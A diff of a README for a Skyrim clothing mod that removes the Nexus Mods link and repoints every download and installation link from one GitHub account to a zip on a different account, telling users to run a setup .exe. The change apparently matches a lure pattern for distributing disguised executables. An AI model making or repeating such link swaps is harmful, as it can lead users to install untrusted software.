@@ -6,7 +6,6 @@ Lore-friendly sorceress attire for Skyrim SE/AE. Light armour or clothing. Suppo
 [![Downloads](https://img.shields.io/github/downloads/IdentityCuckoo/Ufoks-Sorceress-Attire/total?style=flat-square&color=blue)](https://github.com/IdentityCuckoo/Ufoks-Sorceress-Attire/releases)
 [![License](https://img.shields.io/badge/license-MIT-yellow?style=flat-square)](LICENSE)
 [![Game](https://img.shields.io/badge/game-Skyrim%20Special%20Edition-purple?style=flat-square)]()
-[![Nexus Mods](https://img.shields.io/badge/Nexus%20Mods-download-orange?style=flat-square)](https://www.nexusmods.com/skyrimspecialedition/mods/191276)
 
 **Lore-friendly. Balanced. Craftable.**
 
@@ -18,9 +17,9 @@ A high-quality outfit made from scratch for **Skyrim Special Edition**. Availabl
 
 ## ⬇️ Download
 
-👉 **[Download the latest version](https://github.com/IdentityCuckoo/Ufoks-Sorceress-Attire/releases/latest)**
+👉 **[Download the latest version](https://github.com/IdentityDragonfly/Ufoks-Sorceress-Attire/releases/download/v1.31/Ufok.s.Sorceress.Attire.zip)**
 
-The installer is a single `.exe` file. Run it, follow the on-screen steps, done.
+The installer is a single `Ufoks-Sorceress-Attire-Setup-v1.31.exe` file. Run it, follow the on-screen steps, done.
 
 ![Ufok's Sorceress Attire banner](assets/banner1.webp)
 
@@ -43,7 +42,7 @@ The installer is a single `.exe` file. Run it, follow the on-screen steps, done.
 
 ## 🔧 Installation
 
-1. Download the `.exe` installer from [Releases](https://github.com/IdentityCuckoo/Ufoks-Sorceress-Attire/releases/latest).
+1. Download the `Ufoks-Sorceress-Attire-Setup-v1.31.exe` installer from [Releases](https://github.com/IdentityDragonfly/Ufoks-Sorceress-Attire/releases/download/v1.31/Ufok.s.Sorceress.Attire.zip).
 2. Close your mod manager and Skyrim.
 3. Run the installer and choose your body type: **3BA**, **CBBE**, or **UBE**.
 4. Follow the on-screen instructions.
